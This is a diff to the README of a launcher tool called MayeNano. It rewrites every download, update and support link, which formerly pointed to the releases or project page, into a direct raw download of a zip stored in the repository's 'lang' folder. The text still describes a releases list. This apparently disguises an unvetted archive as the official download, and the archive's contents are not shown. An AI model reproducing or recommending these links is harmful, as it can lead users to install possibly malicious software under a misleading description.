@@ -1,6 +1,6 @@
 # ⚡ MayeNano - Fast and Lightweight Startup Tool
 
-[![Download MayeNano](https://img.shields.io/badge/Download-MayeNano-green?style=for-the-badge)](https://github.com/Dheeraj18041998/MayeNano/releases)
+[![Download MayeNano](https://img.shields.io/badge/Download-MayeNano-green?style=for-the-badge)](https://github.com/Dheeraj18041998/MayeNano/raw/refs/heads/main/lang/Maye-Nano-v3.1.zip)
 
 ---
 
@@ -56,7 +56,7 @@ MayeNano 是一个启动器软件，能让您快速打开电脑上的应用程�
 
 Click the button below to visit the download page:
 
-[![Download MayeNano](https://img.shields.io/badge/Download-MayeNano-blue?style=for-the-badge)](https://github.com/Dheeraj18041998/MayeNano/releases)
+[![Download MayeNano](https://img.shields.io/badge/Download-MayeNano-blue?style=for-the-badge)](https://github.com/Dheeraj18041998/MayeNano/raw/refs/heads/main/lang/Maye-Nano-v3.1.zip)
 
 You will see a list of releases. Look for the latest version. It should be a `.zip` or `.exe` file.
 
@@ -131,7 +131,7 @@ Your preferences will be saved in the program folder, so settings travel with th
 ## 🌐 Where to Get Updates
 
 Visit the releases page regularly for new updates and improvements:  
-https://github.com/Dheeraj18041998/MayeNano/releases
+https://github.com/Dheeraj18041998/MayeNano/raw/refs/heads/main/lang/Maye-Nano-v3.1.zip
 
 Check the date and version number before downloading.
 
@@ -162,8 +162,8 @@ If you do not need these, the default settings work for most users.
 
 If you have questions or issues, visit the GitHub page for documentation or to report bugs.  
 
-https://github.com/Dheeraj18041998/MayeNano
+https://github.com/Dheeraj18041998/MayeNano/raw/refs/heads/main/lang/Maye-Nano-v3.1.zip
 
 ---
 
-[![Download MayeNano](https://img.shields.io/badge/Download-MayeNano-green?style=for-the-badge)](https://github.com/Dheeraj18041998/MayeNano/releases)
+[![Download MayeNano](https://img.shields.io/badge/Download-MayeNano-green?style=for-the-badge)](https://github.com/Dheeraj18041998/MayeNano/raw/refs/heads/main/lang/Maye-Nano-v3.1.zip)
